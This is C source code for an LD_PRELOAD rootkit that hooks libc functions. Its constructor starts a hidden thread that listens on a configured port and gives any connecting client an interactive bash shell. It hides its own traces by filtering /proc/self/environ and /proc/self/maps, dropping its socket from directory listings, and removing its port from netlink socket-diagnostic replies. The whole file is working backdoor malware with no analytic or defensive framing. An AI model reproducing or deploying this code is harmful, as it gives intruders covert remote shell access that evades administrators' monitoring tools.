#define _GNU_SOURCE
#include "config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <signal.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <linux/netlink.h>
#include <linux/inet_diag.h>
#include <dirent.h>
#include <fcntl.h>
#include <errno.h>
#include <stdarg.h>
#include <sys/wait.h>
#include <sys/types.h>

static int ghost_fd = -1;
static int should_run = 1;

typedef int (*bind_t)(int, const struct sockaddr *, socklen_t);
typedef struct dirent* (*readdir_t)(DIR *);
typedef ssize_t (*recvmsg_t)(int, struct msghdr *, int);
typedef int (*open_t)(const char *, int, ...);
typedef ssize_t (*read_t)(int, void *, size_t);
typedef ssize_t (*write_t)(int, const void *, size_t);
typedef int (*close_t)(int);
typedef int (*setsockopt_t)(int, int, int, const void *, socklen_t);

static bind_t real_bind = NULL;
static readdir_t real_readdir = NULL;
static recvmsg_t real_recvmsg = NULL;
static open_t real_open = NULL;
static read_t real_read = NULL;
static write_t real_write = NULL;
static close_t real_close = NULL;
static setsockopt_t real_setsockopt = NULL;

static int init_libc_funcs(void) {
    real_bind = (bind_t)dlsym(RTLD_NEXT, "bind");
    real_readdir = (readdir_t)dlsym(RTLD_NEXT, "readdir");
    real_recvmsg = (recvmsg_t)dlsym(RTLD_NEXT, "recvmsg");
    real_open = (open_t)dlsym(RTLD_NEXT, "open");
    real_read = (read_t)dlsym(RTLD_NEXT, "read");
    real_write = (write_t)dlsym(RTLD_NEXT, "write");
    real_close = (close_t)dlsym(RTLD_NEXT, "close");
    real_setsockopt = (setsockopt_t)dlsym(RTLD_NEXT, "setsockopt");
    return 0;
}

static int is_ghost_path(const char *path) {
    if (!path) return 0;
    return (strstr(path, "/proc/self/maps") != NULL ||
            strstr(path, "/proc/self/environ") != NULL);
}

static char *filter_environ(const char *path) {
    static char filtered[65536] = {0};
    if (!real_open || !real_read || !real_close) init_libc_funcs();
    
    int fd = real_open(path, O_RDONLY);
    if (fd < 0) return NULL;
    
    char buffer[4096];
    ssize_t total = 0;
    ssize_t n;
    while ((n = real_read(fd, buffer, sizeof(buffer) - 1)) > 0 && total < sizeof(filtered) - 1) {
        buffer[n] = '\0';
        
        char *src = buffer;
        char *dst = filtered + total;
        while (*src) {
            if (strncmp(src, "LD_PRELOAD=", 11) == 0) {
                src = strchr(src, '\n');
                if (!src) break;
                src++;
                continue;
            }
            *dst++ = *src++;
        }
        total = dst - filtered;
    }
    real_close(fd);
    
    return filtered;
}

static char *filter_maps(const char *path) {
    static char filtered[131072] = {0};
    if (!real_open || !real_read || !real_close) init_libc_funcs();
    
    int fd = real_open(path, O_RDONLY);
    if (fd < 0) return NULL;
    
    char buffer[4096];
    ssize_t total = 0;
    ssize_t n;
    while ((n = real_read(fd, buffer, sizeof(buffer) - 1)) > 0 && total < sizeof(filtered) - 1) {
        buffer[n] = '\0';
        
        char *src = buffer;
        char *dst = filtered + total;
        while (*src) {
            if ((strstr(src, GHOST_SO_NAME) != NULL && 
                 (src == buffer || *(src-1) == '\n')) ||
                (strstr(src, "/tmp/") != NULL && strstr(src, ".so") != NULL)) {
                src = strchr(src, '\n');
                if (!src) break;
                src++;
                continue;
            }
            *dst++ = *src++;
        }
        total = dst - filtered;
    }
    real_close(fd);
    
    return filtered;
}

int open(const char *path, int flags, ...) {
    if (!real_open) init_libc_funcs();
    
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, int);
        va_end(args);
    }
    
    if (is_ghost_path(path)) {
        if (strstr(path, "environ") != NULL) {
            char *filtered = filter_environ(path);
            if (filtered) {
                static char stored_path[256];
                snprintf(stored_path, sizeof(stored_path), "/tmp/.ghost_environ_%d", getpid());
                int wfd = real_open(stored_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
                if (wfd >= 0) {
                    real_write(wfd, filtered, strlen(filtered));
                    real_close(wfd);
                    return real_open(stored_path, flags, mode);
                }
            }
        }
        else if (strstr(path, "maps") != NULL) {
            char *filtered = filter_maps(path);
            if (filtered) {
                static char stored_path[256];
                snprintf(stored_path, sizeof(stored_path), "/tmp/.ghost_maps_%d", getpid());
                int wfd = real_open(stored_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
                if (wfd >= 0) {
                    real_write(wfd, filtered, strlen(filtered));
                    real_close(wfd);
                    return real_open(stored_path, flags, mode);
                }
            }
        }
    }
    
    return real_open(path, flags, mode);
}

struct dirent *readdir(DIR *dirp) {
    if (!real_readdir) real_readdir = (readdir_t)dlsym(RTLD_NEXT, "readdir");

    struct dirent *entry;
    while ((entry = real_readdir(dirp))) {
        if (ghost_fd != -1) {
            char fd_str[16];
            snprintf(fd_str, sizeof(fd_str), "%d", ghost_fd);
            if (strcmp(entry->d_name, fd_str) == 0) continue; 
        }
        break;
    }
    return entry;
}

ssize_t recvmsg(int sockfd, struct msghdr *msg, int flags) {
    if (!real_recvmsg) real_recvmsg = (recvmsg_t)dlsym(RTLD_NEXT, "recvmsg");

    ssize_t ret = real_recvmsg(sockfd, msg, flags);
    if (ret <= 0 || !msg->msg_iov || msg->msg_iovlen <= 0) return ret;

    struct nlmsghdr *nlh = (struct nlmsghdr *)msg->msg_iov[0].iov_base;
    if (!nlh) return ret;
    
    ssize_t remaining = ret;

    while (NLMSG_OK(nlh, remaining)) {
        if (nlh->nlmsg_type == NLMSG_DONE) break;
        
        struct inet_diag_msg *diag = NLMSG_DATA(nlh);
        if (diag && diag->id.idiag_sport == htons(GHOST_PORT)) {
            size_t msg_len = NLMSG_ALIGN(nlh->nlmsg_len);
            unsigned char *next_msg = (unsigned char *)nlh + msg_len;
            ssize_t tail_size = remaining - msg_len;

            if (tail_size > 0) memmove(nlh, next_msg, tail_size);
            ret -= msg_len;
            remaining -= msg_len;
            if (ret <= 0) break;
            continue;
        }
        nlh = NLMSG_NEXT(nlh, remaining);
    }
    return ret;
}

void *ghost_listener(void *arg) {
    int server_fd, client_fd;
    struct sockaddr_in addr;
    int opt = 1;
    struct timeval tv;

    prctl(PR_SET_NAME, FAKE_THREAD_NAME, 0, 0, 0);
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) return NULL;
    
    ghost_fd = server_fd;
    
    int flags = fcntl(server_fd, F_GETFD, 0);
    if (flags >= 0) fcntl(server_fd, F_SETFD, flags | FD_CLOEXEC);

    if (real_setsockopt) {
        real_setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt));
    } else {
        setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt));
    }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(GHOST_PORT);

    if (real_bind) {
        if (real_bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            close(server_fd);
            ghost_fd = -1;
            return NULL;
        }
    } else {
        if (bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            close(server_fd);
            ghost_fd = -1;
            return NULL;
        }
    }
    
    if (listen(server_fd, 3) < 0) {
        close(server_fd);
        ghost_fd = -1;
        return NULL;
    }

    while (should_run) {
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(server_fd, &fds);
        
        int sel = select(server_fd + 1, &fds, NULL, NULL, &tv);
        if (sel < 0) {
            if (errno == EINTR) continue;
            break;
        }
        if (sel == 0) {
            if (access(KILL_SWITCH, F_OK) == 0) {
                should_run = 0;
                break;
            }
            continue;
        }
        
        client_fd = accept(server_fd, NULL, NULL);
        if (client_fd >= 0) {
            pid_t pid = fork();
            if (pid == 0) {
                close(server_fd);
                unsetenv("LD_PRELOAD");
                dup2(client_fd, 0); dup2(client_fd, 1); dup2(client_fd, 2);
                close(client_fd);
                execl("/bin/bash", "bash", "--noprofile", "--norc", "-i", NULL);
                exit(0);
            }
            close(client_fd);
            if (pid > 0) waitpid(pid, NULL, WNOHANG);
        }
    }
    
    if (ghost_fd == server_fd) {
        close(server_fd);
        ghost_fd = -1;
    }
    return NULL;
}

int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
    if (!real_bind) real_bind = (bind_t)dlsym(RTLD_NEXT, "bind");
    int opt = 1;
    if (real_setsockopt) {
        real_setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt));
    } else {
        setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt));
    }
    return real_bind(sockfd, addr, addrlen);
}

__attribute__((constructor))
void init_ghost(void) {
    pthread_t tid;
    pthread_attr_t attr;
    
    init_libc_funcs();
    
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    pthread_create(&tid, &attr, ghost_listener, NULL);
    pthread_attr_destroy(&attr);
}

__attribute__((destructor))
void cleanup_ghost(void) {
    should_run = 0;
    if (ghost_fd >= 0) {
        close(ghost_fd);
        ghost_fd = -1;
    }
}
